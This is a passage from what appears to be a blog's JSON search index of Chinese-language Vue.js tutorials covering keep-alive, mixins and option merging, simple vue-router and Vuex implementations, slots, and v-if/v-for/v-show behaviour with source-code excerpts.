&#125;&#125;\n\n表明该组件还没有被缓存过，则以该组件的key为键，组件vnode为值，将其存入this.cache中，并且把key存入this.keys中\n此时再判断this.keys中缓存组件的数量是否超过了设置的最大缓存数量值this.max，如果超过了，则把第一个缓存组件删掉\n四、思考题：缓存后如何获取数据解决方案可以有以下两种：\n\nbeforeRouteEnter\nactived\n\nbeforeRouteEnter每次组件渲染的时候，都会执行beforeRouteEnter\nbeforeRouteEnter(to, from, next)&#123;    next(vm=&gt;&#123;        console.log(vm)        // 每次进入路由执行        vm.getData()  // 获取数据    &#125;)&#125;,\n\nactived在keep-alive缓存的组件被激活的时候，都会执行actived钩子\nactivated()&#123;   this.getData() // 获取数据&#125;,\n\n注意：服务器端渲染期间avtived不被调用\n","categories":["框架"],"tags":["vue"]},{"title":"vue-mixin","url":"/2018/06/30/Vue/vue-mixin/","content":"vue-router一、mixin是什么Mixin是面向对象程序设计语言中的类，提供了方法的实现。其他类可以访问mixin类的方法而不必成为其子类\nMixin类通常作为功能模块使用，在需要该功能时“混入”，有利于代码复用又避免了多继承的复杂\nVue中的mixin先来看一下官方定义\n\nmixin（混入），提供了一种非常灵活的方式，来分发 Vue 组件中的可复用功能。\n\n本质其实就是一个js对象，它可以包含我们组件中任意功能选项，如data、components、methods、created、computed等等\n我们只要将共用的功能以对象的方式传入 mixins选项中，当组件使用 mixins对象时所有mixins对象的选项都将被混入该组件本身的选项中来\n在Vue中我们可以局部混入跟全局混入\n局部混入定义一个mixin对象，有组件options的data、methods属性\nvar myMixin = &#123;  created: function () &#123;    this.hello()  &#125;,  methods: &#123;    hello: function () &#123;      console.log(&#x27;hello from mixin!&#x27;)    &#125;  &#125;&#125;\n\n组件通过mixins属性调用mixin对象\nVue.component(&#x27;componentA&#x27;,&#123;  mixins: [myMixin]&#125;)\n\n该组件在使用的时候，混合了mixin里面的方法，在自动执行create生命钩子，执行hello方法\n全局混入通过Vue.mixin()进行全局的混入\nVue.mixin(&#123;  created: function () &#123;      console.log(&quot;全局混入&quot;)    &#125;&#125;)\n\n使用全局混入需要特别注意，因为它会影响到每一个组件实例（包括第三方组件）\nPS：全局混入常用于插件的编写\n注意事项：当组件存在与mixin对象相同的选项的时候，进行递归合并的时候组件的选项会覆盖mixin的选项\n但是如果相同选项为生命周期钩子的时候，会合并成一个数组，先执行mixin的钩子，再执行组件的钩子\n二、使用场景在日常的开发中，我们经常会遇到在不同的组件中经常会需要用到一些相同或者相似的代码，这些代码的功能相对独立\n这时，可以通过Vue的mixin功能将相同或者相似的代码提出来\n举个例子\n定义一个modal弹窗组件，内部通过isShowing来控制显示\nconst Modal = &#123;  template: &#x27;#modal&#x27;,  data() &#123;    return &#123;      isShowing: false    &#125;  &#125;,  methods: &#123;    toggleShow() &#123;      this.isShowing = !this.isShowing;    &#125;  &#125;&#125;\n\n定义一个tooltip提示框，内部通过isShowing来控制显示\nconst Tooltip = &#123;  template: &#x27;#tooltip&#x27;,  data() &#123;    return &#123;      isShowing: false    &#125;  &#125;,  methods: &#123;    toggleShow() &#123;      this.isShowing = !this.isShowing;    &#125;  &#125;&#125;\n\n通过观察上面两个组件，发现两者的逻辑是相同，代码控制显示也是相同的，这时候mixin就派上用场了\n首先抽出共同代码，编写一个mixin\nconst toggle = &#123;  data() &#123;    return &#123;      isShowing: false    &#125;  &#125;,  methods: &#123;    toggleShow() &#123;      this.isShowing = !this.isShowing;    &#125;  &#125;&#125;\n\n两个组件在使用上，只需要引入mixin\nconst Modal = &#123;  template: &#x27;#modal&#x27;,  mixins: [toggle]&#125;; const Tooltip = &#123;  template: &#x27;#tooltip&#x27;,  mixins: [toggle]&#125;\n\n通过上面小小的例子，让我们知道了Mixin对于封装一些可复用的功能如此有趣、方便、实用\n三、源码分析首先从Vue.mixin入手\n源码位置：&#x2F;src&#x2F;core&#x2F;global-api&#x2F;mixin.js\nexport function initMixin (Vue: GlobalAPI) &#123;  Vue.mixin = function (mixin: Object) &#123;    this.options = mergeOptions(this.options, mixin)    return this  &#125;&#125;\n\n主要是调用merOptions方法\n源码位置：&#x2F;src&#x2F;core&#x2F;util&#x2F;options.js\nexport function mergeOptions (  parent: Object,  child: Object,  vm?: Component): Object &#123;if (child.mixins) &#123; // 判断有没有mixin 也就是mixin里面挂mixin的情况 有的话递归进行合并    for (let i = 0, l = child.mixins.length; i &lt; l; i++) &#123;    parent = mergeOptions(parent, child.mixins[i], vm)    &#125;&#125;  const options = &#123;&#125;   let key  for (key in parent) &#123;    mergeField(key) // 先遍历parent的key 调对应的strats[XXX]方法进行合并  &#125;  for (key in child) &#123;    if (!hasOwn(parent, key)) &#123; // 如果parent已经处理过某个key 就不处理了      mergeField(key) // 处理child中的key 也就parent中没有处理过的key    &#125;  &#125;  function mergeField (key) &#123;    const strat = strats[key] || defaultStrat    options[key] = strat(parent[key], child[key], vm, key) // 根据不同类型的options调用strats中不同的方法进行合并  &#125;  return options&#125;\n\n从上面的源码，我们得到以下几点：\n\n优先递归处理 mixins\n先遍历合并parent 中的key，调用mergeField方法进行合并，然后保存在变量options\n再遍历 child，合并补上 parent 中没有的key，调用mergeField方法进行合并，保存在变量options\n通过 mergeField 函数进行了合并\n\n下面是关于Vue的几种类型的合并策略\n\n替换型\n合并型\n队列型\n叠加型\n\n替换型替换型合并有props、methods、inject、computed\nstrats.props =strats.methods =strats.inject =strats.computed = function (  parentVal: ?Object,  childVal: ?Object,  vm?: Component,  key: string): ?Object &#123;  if (!parentVal) return childVal // 如果parentVal没有值，直接返回childVal  const ret = Object.create(null) // 创建一个第三方对象 ret  extend(ret, parentVal) // extend方法实际是把parentVal的属性复制到ret中  if (childVal) extend(ret, childVal) // 把childVal的属性复制到ret中  return ret&#125;strats.provide = mergeDataOrFn\n\n同名的props、methods、inject、computed会被后来者代替\n合并型和并型合并有：data\nstrats.data = function(parentVal, childVal, vm) &#123;        return mergeDataOrFn(        parentVal, childVal, vm    )&#125;;function mergeDataOrFn(parentVal, childVal, vm) &#123;        return function mergedInstanceDataFn() &#123;                var childData = childVal.call(vm, vm) // 执行data挂的函数得到对象        var parentData = parentVal.call(vm, vm)                if (childData) &#123;                        return mergeData(childData, parentData) // 将2个对象进行合并                                         &#125; else &#123;                        return parentData // 如果没有childData 直接返回parentData        &#125;    &#125;&#125;function mergeData(to, from) &#123;        if (!from) return to        var key, toVal, fromVal;        var keys = Object.keys(from);       for (var i = 0; i &lt; keys.length; i++) &#123;        key = keys[i];        toVal = to[key];        fromVal = from[key];            // 如果不存在这个属性，就重新设置        if (!to.hasOwnProperty(key)) &#123;            set(to, key, fromVal);        &#125;              // 存在相同属性，合并对象        else if (typeof toVal ==&quot;object&quot; &amp;&amp; typeof fromVal ==&quot;object&quot;) &#123;            mergeData(toVal, fromVal);        &#125;    &#125;        return to&#125;\n\nmergeData函数遍历了要合并的 data 的所有属性，然后根据不同情况进行合并：\n\n当目标 data 对象不包含当前属性时，调用 set 方法进行合并（set方法其实就是一些合并重新赋值的方法）\n当目标 data 对象包含当前属性并且当前值为纯对象时，递归合并当前对象值，这样做是为了防止对象存在新增属性\n\n队列性队列性合并有：全部生命周期和watch\nfunction mergeHook (  parentVal: ?Array&lt;Function&gt;,  childVal: ?Function | ?Array&lt;Function&gt;): ?Array&lt;Function&gt; &#123;  return childVal    ? parentVal      ? parentVal.concat(childVal)      : Array.isArray(childVal)        ? childVal        : [childVal]    : parentVal&#125;LIFECYCLE_HOOKS.forEach(hook =&gt; &#123;  strats[hook] = mergeHook&#125;)// watchstrats.watch = function (  parentVal,  childVal,  vm,  key) &#123;  // work around Firefox&#x27;s Object.prototype.watch...  if (parentVal === nativeWatch) &#123; parentVal = undefined; &#125;  if (childVal === nativeWatch) &#123; childVal = undefined; &#125;  /* istanbul ignore if */  if (!childVal) &#123; return Object.create(parentVal || null) &#125;  &#123;    assertObjectType(key, childVal, vm);  &#125;  if (!parentVal) &#123; return childVal &#125;  var ret = &#123;&#125;;  extend(ret, parentVal);  for (var key$1 in childVal) &#123;    var parent = ret[key$1];    var child = childVal[key$1];    if (parent &amp;&amp; !Array.isArray(parent)) &#123;      parent = [parent];    &#125;    ret[key$1] = parent      ? parent.concat(child)      : Array.isArray(child) ? child : [child];  &#125;  return ret&#125;;\n\n生命周期钩子和watch被合并为一个数组，然后正序遍历一次执行\n叠加型叠加型合并有：component、directives、filters\nstrats.components=strats.directives=strats.filters = function mergeAssets(    parentVal, childVal, vm, key) &#123;        var res = Object.create(parentVal || null);        if (childVal) &#123;         for (var key in childVal) &#123;            res[key] = childVal[key];        &#125;       &#125;     return res&#125;\n\n叠加型主要是通过原型链进行层层的叠加\n小结：\n替换型策略有props、methods、inject、computed，就是将新的同名参数替代旧的参数\n合并型策略是data, 通过set方法进行合并和重新赋值\n队列型策略有生命周期函数和watch，原理是将函数存入一个数组，然后正序遍历依次执行\n叠加型有component、directives、filters，通过原型链进行层层的叠加\n\n","categories":["框架"],"tags":["vue"]},{"title":"vue-router+vuex原理","url":"/2018/07/02/Vue/vue-router+vuex%E5%8E%9F%E7%90%86/","content":"vue-router\nVue Router 是 Vue.js 官方的路由管理器。它和 Vue.js 的核心深度集成，让构建单⻚面应用变得易如反 掌。\n\n安装: vue add router 核心步骤:\n\n步骤一:使用vue-router插件，router.js\n\nimport Router from &#x27;vue-router&#x27; Vue.use(Router)\n\n\n步骤二:创建Router实例，router.js\n\nexport default new Router(&#123;...&#125;)\n\n\n步骤三:在根组件上添加该实例，main.js\n\nimport router from &#x27;./router&#x27;new Vue(&#123;    router,&#125;).$mount(&quot;#app&quot;);\n\n\n步骤四:添加路由视图，App.vue\n\n&lt;router-view&gt;&lt;/router-view&gt;\n\n导航\n&lt;router-link to=&quot;/&quot;&gt;Home&lt;/router-link&gt; &lt;router-link to=&quot;/about&quot;&gt;About&lt;/router-link&gt;\n\nvue-router源码实现\n作为一个插件存在:实现VueRouter类和install方法\n实现两个全局组件:router-view用于显示匹配组件内容，router-link用于跳转\n监控url变化:监听hashchange或popstate事件\n响应最新url:创建一个响应式的属性current，当它改变时获取对应组件并显示\n\n创建kvue-router.js\n// 我们的插件：// 1.实现一个Router类并挂载期实例// 2.实现两个全局组件router-link和router-viewlet Vue;class VueRouter &#123;  // 核心任务：  // 1.监听url变化  constructor(options) &#123;    this.$options = options;    // 缓存path和route映射关系    // 这样找组件更快    this.routeMap = &#123;&#125;    this.$options.routes.forEach(route =&gt; &#123;      this.routeMap[route.path] = route    &#125;)    // 数据响应式    // 定义一个响应式的current，则如果他变了，那么使用它的组件会rerender    Vue.util.defineReactive(this, &#x27;current&#x27;, &#x27;&#x27;)    // 请确保onHashChange中this指向当前实例    window.addEventListener(&#x27;hashchange&#x27;, this.onHashChange.bind(this))    window.addEventListener(&#x27;load&#x27;, this.onHashChange.bind(this))  &#125;  onHashChange() &#123;    // console.log(window.location.hash);    this.current = window.location.hash.slice(1) || &#x27;/&#x27;  &#125;&#125;// 插件需要实现install方法// 接收一个参数，Vue构造函数，主要用于数据响应式VueRouter.install = function (_Vue) &#123;  // 保存Vue构造函数在VueRouter中使用  Vue = _Vue  // 任务1：使用混入来做router挂载这件事情  Vue.mixin(&#123;    beforeCreate() &#123;      // 只有根实例才有router选项      if (this.$options.router) &#123;        Vue.prototype.$router = this.$options.router      &#125;    &#125;  &#125;)  // 任务2：实现两个全局组件  // router-link: 生成一个a标签，在url后面添加#  // &lt;a href=&quot;#/about&quot;&gt;aaaa&lt;/a&gt;  // &lt;router-link to=&quot;/about&quot;&gt;aaa&lt;/router-link&gt;  Vue.component(&#x27;router-link&#x27;, &#123;    props: &#123;      to: &#123;        type: String,        required: true      &#125;,    &#125;,    render(h) &#123;      // h(tag, props, children)      return h(&#x27;a&#x27;,        &#123; attrs: &#123; href: &#x27;#&#x27; + this.to &#125; &#125;,        this.$slots.default      )      // 使用jsx      // return &lt;a href=&#123;&#x27;#&#x27;+this.to&#125;&gt;&#123;this.$slots.default&#125;&lt;/a&gt;    &#125;  &#125;)  Vue.component(&#x27;router-view&#x27;, &#123;    render(h) &#123;      // 根据current获取组件并render      // current怎么获取?      // console.log(&#x27;render&#x27;,this.$router.current);      // 获取要渲染的组件      let component = null      const &#123; routeMap, current &#125; = this.$router      if (routeMap[current]) &#123;        component = routeMap[current].component      &#125;      return h(component)    &#125;  &#125;)&#125;export default VueRouter\n\nVuex\nVuex 集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以可预测的方式发生变化\n\n整合vuexvue add vuex\n\n核心概念\n\nstate 状态、数据\nmutations 更改状态的函数\nactions 异步操作\nstore 包含以上概念的容器\n\n\n状态 - state\n\nstate保存应用状态\nexport default new Vuex.Store(&#123; state: &#123; counter:0 &#125;,&#125;)\n\n\n状态变更 - mutations\n\nmutations用于修改状态，store.js\nexport default new Vuex.Store(&#123;    mutations:    &#123;      add(state) &#123;        state.counter++      &#125;    &#125;  &#125;)\n\n\n派生状态 - getters\n\n从state派生出新状态，类似计算属性\nexport default new Vuex.Store(&#123;    getters:    &#123;      doubleCounter(state) &#123; // 计算剩余数量 return state.counter * 2;      &#125;    &#125;  &#125;)\n\n\n动作 - actions\n\n加业务逻辑，类似于controller\nexport default new Vuex.Store(&#123;    actions:    &#123;      add(&#123;        commit      &#125;) &#123;        setTimeout(() = &gt;&#123;&#125;      &#125;    &#125;)\n\n测试代码:\n&lt;p @click=&quot;$store.commit(&#x27;add&#x27;)&quot;&gt;counter: &#123;&#123;$store.state.counter&#125;&#125;&lt;/p&gt;&lt;p @click=&quot;$store.dispatch(&#x27;add&#x27;)&quot;&gt;async counter: &#123;&#123;$store.state.counter&#125;&#125;&lt;/p&gt;&lt;p&gt;double:&#123;&#123;$store.getters.doubleCounter&#125;&#125;&lt;/p&gt;\n\nvuex原理解析\n实现一个插件:声明Store类，挂载$store\nStore具体实现:\n创建响应式的state，保存mutations、actions和getters\n实现commit根据用户传入type执行对应mutation\n实现dispatch根据用户传入type执行对应action，同时传递上下文\n实现getters，按照getters定义对state做派生\n\n\n\n// 目标1：实现Store类，管理state（响应式的），commit方法和dispatch方法// 目标2：封装一个插件，使用更容易使用let Vue;class Store &#123;  constructor(options) &#123;    // 定义响应式的state    // this.$store.state.xx    // 借鸡生蛋    this._vm = new Vue(&#123;      data: &#123;        $$state: options.state      &#125;    &#125;)        this._mutations = options.mutations    this._actions = options.actions    // 绑定this指向    this.commit = this.commit.bind(this)    this.dispatch = this.dispatch.bind(this)  &#125;  // 只读  get state() &#123;    return this._vm._data.$$state  &#125;  set state(val) &#123;    console.error(&#x27;不能直接赋值呀，请换别的方式！！天王盖地虎！！&#x27;);      &#125;    // 实现commit方法，可以修改state  commit(type, payload) &#123;    // 拿出mutations中的处理函数执行它    const entry = this._mutations[type]    if (!entry) &#123;      console.error(&#x27;未知mutaion类型&#x27;);      return    &#125;    entry(this.state, payload)  &#125;  dispatch(type, payload) &#123;    const entry = this._actions[type]    if (!entry) &#123;      console.error(&#x27;未知action类型&#x27;);      return    &#125;    // 上下文可以传递当前store实例进去即可    entry(this, payload)  &#125;&#125;function install(_Vue)&#123;  Vue = _Vue  // 混入store实例  Vue.mixin(&#123;    beforeCreate() &#123;      if (this.$options.store) &#123;        Vue.prototype.$store = this.$options.store      &#125;    &#125;  &#125;)&#125;// &#123; Store, install &#125;相当于Vuex// 它必须实现install方法export default &#123; Store, install &#125;","categories":["框架"],"tags":["vue"]},{"title":"vue-slot插槽","url":"/2018/07/05/Vue/vue-slot%E6%8F%92%E6%A7%BD/","content":"一、slot是什么在HTML中 slot 元素 ，作为 Web Components 技术套件的一部分，是Web组件内的一个占位符\n该占位符可以在后期使用自己的标记语言填充\n举个栗子\n&lt;template id=&quot;element-details-template&quot;&gt;  &lt;slot name=&quot;element-name&quot;&gt;Slot template&lt;/slot&gt;&lt;/template&gt;&lt;element-details&gt;  &lt;span slot=&quot;element-name&quot;&gt;1&lt;/span&gt;&lt;/element-details&gt;&lt;element-details&gt;  &lt;span slot=&quot;element-name&quot;&gt;2&lt;/span&gt;&lt;/element-details&gt;\n\ntemplate不会展示到页面中，需要优先获取它的引用，然后添加到DOM中，\ncustomElements.define(&#x27;element-details&#x27;,  class extends HTMLElement &#123;    constructor() &#123;      super();      const template = document        .getElementById(&#x27;element-details-template&#x27;)        .content;      const shadowRoot = this.attachShadow(&#123;mode: &#x27;open&#x27;&#125;)        .appendChild(template.cloneNode(true));  &#125;&#125;)\n\n在Vue中的概念也是如此\nSlot 艺名插槽，花名“占坑”，我们可以理解为solt在组件模板中占好了位置，当使用该组件标签时候，组件标签里面的内容就会自动填坑（替换组件模板中slot位置），作为承载分发内容的出口\n可以将其类比为插卡式的FC游戏机，游戏机暴露卡槽（插槽）让用户插入不同的游戏磁条（自定义内容）\n放张图感受一下 \n二、使用场景通过插槽可以让用户可以拓展组件，去更好地复用组件和对其做定制化处理\n如果父组件在使用到一个复用组件的时候，获取这个组件在不同的地方有少量的更改，如果去重写组件是一件不明智的事情\n通过slot插槽向组件内部指定位置传递内容，完成这个复用组件在不同场景的应用\n比如布局组件、表格列、下拉选、弹框显示内容等\n三、分类slot可以分来以下三种：\n\n默认插槽\n具名插槽\n作用域插槽\n\n默认插槽子组件用&#96;&#96;标签来确定渲染的位置，标签里面可以放DOM结构，当父组件使用的时候没有往插槽传入内容，标签内DOM结构就会显示在页面\n父组件在使用的时候，直接在子组件的标签内写入内容即可\n子组件Child.vue\n&lt;template&gt;    &lt;slot&gt;      &lt;p&gt;插槽后备的内容&lt;/p&gt;    &lt;/slot&gt;&lt;/template&gt;\n\n父组件\n&lt;Child&gt;  &lt;div&gt;默认插槽&lt;/div&gt;  &lt;/Child&gt;\n\n具名插槽子组件用name属性来表示插槽的名字，不传为默认插槽\n父组件中在使用时在默认插槽的基础上加上slot属性，值为子组件插槽name属性值\n子组件Child.vue\n&lt;template&gt;    &lt;slot&gt;插槽后备的内容&lt;/slot&gt;  &lt;slot name=&quot;content&quot;&gt;插槽后备的内容&lt;/slot&gt;&lt;/template&gt;\n\n父组件\n&lt;child&gt;    &lt;template v-slot:default&gt;具名插槽&lt;/template&gt;    &lt;!-- 具名插槽⽤插槽名做参数 --&gt;    &lt;template v-slot:content&gt;内容...&lt;/template&gt;&lt;/child&gt;\n\n作用域插槽子组件在作用域上绑定属性来将子组件的信息传给父组件使用，这些属性会被挂在父组件v-slot接受的对象上\n父组件中在使用时通过v-slot:（简写：#）获取子组件的信息，在内容中使用\n子组件Child.vue\n&lt;template&gt;   &lt;slot name=&quot;footer&quot; testProps=&quot;子组件的值&quot;&gt;          &lt;h3&gt;没传footer插槽&lt;/h3&gt;    &lt;/slot&gt;&lt;/template&gt;\n\n父组件\n&lt;child&gt;     &lt;!-- 把v-slot的值指定为作⽤域上下⽂对象 --&gt;    &lt;template v-slot:default=&quot;slotProps&quot;&gt;      来⾃⼦组件数据：&#123;&#123;slotProps.testProps&#125;&#125;    &lt;/template&gt;    &lt;template #default=&quot;slotProps&quot;&gt;      来⾃⼦组件数据：&#123;&#123;slotProps.testProps&#125;&#125;    &lt;/template&gt;&lt;/child&gt;\n\n小结：\nv-slot属性只能在&#96;上使用，但在只有默认插槽时可以在组件标签上使用\n默认插槽名为default，可以省略default直接写v-slot\n缩写为#时不能不写参数，写成#default\n可以通过解构获取v-slot=&#123;user&#125;，还可以重命名v-slot=&quot;&#123;user: newName&#125;&quot;和定义默认值v-slot=&quot;&#123;user = &#39;默认值&#39;&#125;&quot;\n\n四、原理分析slot本质上是返回VNode的函数，一般情况下，Vue中的组件要渲染到页面上需要经过template -&gt; render function -&gt; VNode -&gt; DOM 过程，这里看看slot如何实现：\n编写一个buttonCounter组件，使用匿名插槽\nVue.component(&#x27;button-counter&#x27;, &#123;  template: &#x27;&lt;div&gt; &lt;slot&gt;我是默认内容&lt;/slot&gt;&lt;/div&gt;&#x27;&#125;)\n\n使用该组件\nnew Vue(&#123;    el: &#x27;#app&#x27;,    template: &#x27;&lt;button-counter&gt;&lt;span&gt;我是slot传入内容&lt;/span&gt;&lt;/button-counter&gt;&#x27;,    components:&#123;buttonCounter&#125;&#125;)\n\n获取buttonCounter组件渲染函数\n(function anonymous() &#123;with(this)&#123;return _c(&#x27;div&#x27;,[_t(&quot;default&quot;,[_v(&quot;我是默认内容&quot;)])],2)&#125;&#125;)\n\n_v表示穿件普通文本节点，_t表示渲染插槽的函数\n渲染插槽函数renderSlot（做了简化）\nfunction renderSlot (  name,  fallback,  props,  bindObject) &#123;  // 得到渲染插槽内容的函数      var scopedSlotFn = this.$scopedSlots[name];  var nodes;  // 如果存在插槽渲染函数，则执行插槽渲染函数，生成nodes节点返回  // 否则使用默认值  nodes = scopedSlotFn(props) || fallback;  return nodes;&#125;\n\nname属性表示定义插槽的名字，默认值为default，fallback表示子组件中的slot节点的默认值\n关于this.$scopredSlots是什么，我们可以先看看vm.slot\nfunction initRender (vm) &#123;  ...  vm.$slots = resolveSlots(options._renderChildren, renderContext);  ...&#125;\n\nresolveSlots`函数会对`children`节点做归类和过滤处理，返回`slotsfunction resolveSlots (    children,    context  ) &#123;    if (!children || !children.length) &#123;      return &#123;&#125;    &#125;    var slots = &#123;&#125;;    for (var i = 0, l = children.length; i &lt; l; i++) &#123;      var child = children[i];      var data = child.data;      // remove slot attribute if the node is resolved as a Vue slot node      if (data &amp;&amp; data.attrs &amp;&amp; data.attrs.slot) &#123;        delete data.attrs.slot;      &#125;      // named slots should only be respected if the vnode was rendered in the      // same context.      if ((child.context === context || child.fnContext === context) &amp;&amp;        data &amp;&amp; data.slot != null      ) &#123;        // 如果slot存在(slot=&quot;header&quot;) 则拿对应的值作为key        var name = data.slot;        var slot = (slots[name] || (slots[name] = []));        // 如果是tempalte元素 则把template的children添加进数组中，这也就是为什么你写的template标签并不会渲染成另一个标签到页面        if (child.tag === &#x27;template&#x27;) &#123;          slot.push.apply(slot, child.children || []);        &#125; else &#123;          slot.push(child);        &#125;      &#125; else &#123;        // 如果没有就默认是default        (slots.default || (slots.default = [])).push(child);      &#125;    &#125;    // ignore slots that contains only whitespace    for (var name$1 in slots) &#123;      if (slots[name$1].every(isWhitespace)) &#123;        delete slots[name$1];      &#125;    &#125;    return slots&#125;\n\n_render`渲染函数通过`normalizeScopedSlots`得到`vm.$scopedSlotsvm.$scopedSlots = normalizeScopedSlots(  _parentVnode.data.scopedSlots,  vm.$slots,  vm.$scopedSlots);\n\n作用域插槽中父组件能够得到子组件的值是因为在renderSlot的时候执行会传入props，也就是上述_t第三个参数，父组件则能够得到子组件传递过来的值\n","categories":["框架"],"tags":["vue"]},{"title":"vue-v-if与v-for为什么不建议一起用","url":"/2018/07/11/Vue/vue-v-if%E4%B8%8Ev-for%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E5%BB%BA%E8%AE%AE%E4%B8%80%E8%B5%B7%E7%94%A8/","content":"一、作用v-if 指令用于条件性地渲染一块内容。这块内容只会在指令的表达式返回 true值的时候被渲染\nv-for 指令基于一个数组来渲染一个列表。v-for 指令需要使用 item in items 形式的特殊语法，其中 items 是源数据数组或者对象，而 item 则是被迭代的数组元素的别名\n在 v-for 的时候，建议设置key值，并且保证每个key值是独一无二的，这便于diff算法进行优化\n两者在用法上\n&lt;Modal v-if=&quot;isShow&quot; /&gt;&lt;li v-for=&quot;item in items&quot; :key=&quot;item.id&quot;&gt;    &#123;&#123; item.label &#125;&#125;&lt;/li&gt;\n\n二、优先级v-if与v-for都是vue模板系统中的指令\n在vue模板编译的时候，会将指令系统转化成可执行的render函数\n示例编写一个p标签，同时使用v-if与 v-for\n&lt;div id=&quot;app&quot;&gt;    &lt;p v-if=&quot;isShow&quot; v-for=&quot;item in items&quot;&gt;        &#123;&#123; item.title &#125;&#125;    &lt;/p&gt;&lt;/div&gt;\n\n创建vue实例，存放isShow与items数据\nconst app = new Vue(&#123;  el: &quot;#app&quot;,  data() &#123;    return &#123;      items: [        &#123; title: &quot;foo&quot; &#125;,        &#123; title: &quot;baz&quot; &#125;]    &#125;  &#125;,  computed: &#123;    isShow() &#123;      return this.items &amp;&amp; this.items.length &gt; 0    &#125;  &#125;&#125;)\n\n模板指令的代码都会生成在render函数中，通过app.$options.render就能得到渲染函数\nƒ anonymous() &#123;  with (this) &#123; return     _c(&#x27;div&#x27;, &#123; attrs: &#123; &quot;id&quot;: &quot;app&quot; &#125; &#125;,     _l((items), function (item)     &#123; return (isShow) ? _c(&#x27;p&#x27;, [_v(&quot;\\n&quot; + _s(item.title) + &quot;\\n&quot;)]) : _e() &#125;), 0) &#125;&#125;\n\n_l是vue的列表渲染函数，函数内部都会进行一次if判断\n初步得到结论：v-for优先级是比v-if高\n再将v-for与v-if置于不同标签\n&lt;div id=&quot;app&quot;&gt;    &lt;template v-if=&quot;isShow&quot;&gt;        &lt;p v-for=&quot;item in items&quot;&gt;&#123;&#123;item.title&#125;&#125;&lt;/p&gt;    &lt;/template&gt;&lt;/div&gt;\n\n再输出下render函数\nƒ anonymous() &#123;  with(this)&#123;return     _c(&#x27;div&#x27;,&#123;attrs:&#123;&quot;id&quot;:&quot;app&quot;&#125;&#125;,    [(isShow)?[_v(&quot;\\n&quot;),    _l((items),function(item)&#123;return _c(&#x27;p&#x27;,[_v(_s(item.title))])&#125;)]:_e()],2)&#125;&#125;\n\n这时候我们可以看到，v-for与v-if作用在不同标签时候，是先进行判断，再进行列表的渲染\n我们再在查看下vue源码\n源码位置：\\vue-dev\\src\\compiler\\codegen\\index.js\nexport function genElement (el: ASTElement, state: CodegenState): string &#123;  if (el.parent) &#123;    el.pre = el.pre || el.parent.pre  &#125;  if (el.staticRoot &amp;&amp; !el.staticProcessed) &#123;    return genStatic(el, state)  &#125; else if (el.once &amp;&amp; !el.onceProcessed) &#123;    return genOnce(el, state)  &#125; else if (el.for &amp;&amp; !el.forProcessed) &#123;    return genFor(el, state)  &#125; else if (el.if &amp;&amp; !el.ifProcessed) &#123;    return genIf(el, state)  &#125; else if (el.tag === &#x27;template&#x27; &amp;&amp; !el.slotTarget &amp;&amp; !state.pre) &#123;    return genChildren(el, state) || &#x27;void 0&#x27;  &#125; else if (el.tag === &#x27;slot&#x27;) &#123;    return genSlot(el, state)  &#125; else &#123;    // component or element    ...&#125;\n\n在进行if判断的时候，v-for是比v-if先进行判断\n最终结论：v-for优先级比v-if高\n三、注意事项\n永远不要把 v-if 和 v-for 同时用在同一个元素上，带来性能方面的浪费（每次渲染都会先循环再进行条件判断）\n如果避免出现这种情况，则在外层嵌套template（页面渲染不生成dom节点），在这一层进行v-if判断，然后在内部进行v-for循环\n\n&lt;template v-if=&quot;isShow&quot;&gt;    &lt;p v-for=&quot;item in items&quot;&gt;&lt;/template&gt;\n\n\n如果条件出现在循环内部，可通过计算属性computed提前过滤掉那些不需要显示的项\n\ncomputed: &#123;    items: function() &#123;      return this.list.filter(function (item) &#123;        return item.isShow      &#125;)    &#125;&#125;","categories":["框架"],"tags":["vue"]},{"title":"vue-v-if与v-show的区别","url":"/2018/07/15/Vue/vue-v-if%E4%B8%8Ev-show%E7%9A%84%E5%8C%BA%E5%88%AB/","content":"一、v-show与v-if的共同点我们都知道在 vue 中 v-show 与 v-if 的作用效果是相同的(不含v-else)，都能控制元素在页面是否显示\n在用法上也是相同的\n&lt;Model v-show=&quot;isShow&quot; /&gt;&lt;Model v-if=&quot;isShow&quot; /&gt;\n\n\n当表达式为true的时候，都会占据页面的位置\n当表达式都为false时，都不会占据页面位置\n\n二、v-show与v-if的区别\n控制手段不同\n编译过程不同\n编译条件不同\n\n控制手段：v-show隐藏则是为该元素添加css--display:none，dom元素依旧还在。v-if显示隐藏是将dom元素整个添加或删除\n编译过程：v-if切换有一个局部编译&#x2F;卸载的过程，切换过程中合适地销毁和重建内部的事件监听和子组件；v-show只是简单的基于css切换\n编译条件：v-if是真正的条件渲染，它会确保在切换过程中条件块内的事件监听器和子组件适当地被销毁和重建。只有渲染条件为假时，并不做操作，直到为真才渲染\n\nv-show 由false变为true的时候不会触发组件的生命周期\nv-if由false变为true的时候，触发组件的beforeCreate、create、beforeMount、mounted钩子，由true变为false的时候触发组件的beforeDestory、destoryed方法\n\n性能消耗：v-if有更高的切换消耗；v-show有更高的初始渲染消耗；\n三、v-show与v-if原理分析具体解析流程这里不展开讲，大致流程如下\n\n将模板template转为ast结构的JS对象\n用ast得到的JS对象拼装render和staticRenderFns函数\nrender和staticRenderFns函数被调用后生成虚拟VNODE节点，该节点包含创建DOM节点所需信息\nvm.patch函数通过虚拟DOM算法利用VNODE节点创建真实DOM节点\n\nv-show原理不管初始条件是什么，元素总是会被渲染\n我们看一下在vue中是如何实现的\n代码很好理解，有transition就执行transition，没有就直接设置display属性\n// https://github.com/vuejs/vue-next/blob/3cd30c5245da0733f9eb6f29d220f39c46518162/packages/runtime-dom/src/directives/vShow.tsexport const vShow: ObjectDirective&lt;VShowElement&gt; = &#123;  beforeMount(el, &#123; value &#125;, &#123; transition &#125;) &#123;    el._vod = el.style.display === &#x27;none&#x27; ? &#x27;&#x27; : el.style.display    if (transition &amp;&amp; value) &#123;      transition.beforeEnter(el)    &#125; else &#123;      setDisplay(el, value)    &#125;  &#125;,  mounted(el, &#123; value &#125;, &#123; transition &#125;) &#123;    if (transition &amp;&amp; value) &#123;      transition.enter(el)    &#125;  &#125;,  updated(el, &#123; value, oldValue &#125;, &#123; transition &#125;) &#123;    // ...  &#125;,  beforeUnmount(el, &#123; value &#125;) &#123;    setDisplay(el, value)  &#125;&#125;\n\nv-if原理v-if在实现上比v-show要复杂的多，因为还有else else-if 等条件需要处理，这里我们也只摘抄源码中处理 v-if 的一小部分\n返回一个node节点，render函数通过表达式的值来决定是否生成DOM\n// 